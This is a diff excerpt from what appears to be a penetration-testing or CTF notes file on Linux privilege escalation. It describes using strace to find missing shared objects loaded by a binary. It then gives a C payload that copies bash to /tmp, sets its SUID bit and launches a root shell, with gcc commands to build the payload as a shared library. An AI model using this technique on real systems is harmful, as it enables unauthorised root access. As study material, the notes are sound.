@@ -753,7 +753,7 @@ Take note of where the PATH is if the full PATH isn't declared
 `strace $binary 2>&1` - strace intercepts and records the system calls which are called by a process and the signals which are received by a process.
 - then try to overwrite anything that shows up as (No such file or directory)
 - may need a .c file to exploit, EX:
-	
+	```
 	#include <stdio.h>
 	#include <stdlib.h>
 
@@ -762,7 +762,7 @@ Take note of where the PATH is if the full PATH isn't declared
 	void inject() {
 		system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 	}
-	
+	```
 - then `gcc -shared -fPIC -o $outputLocation $exploitLocation.c`
 - `gcc -shared -fPIC -nostartfiles -o file file.c`
 - note that you can change this to `$file.so`
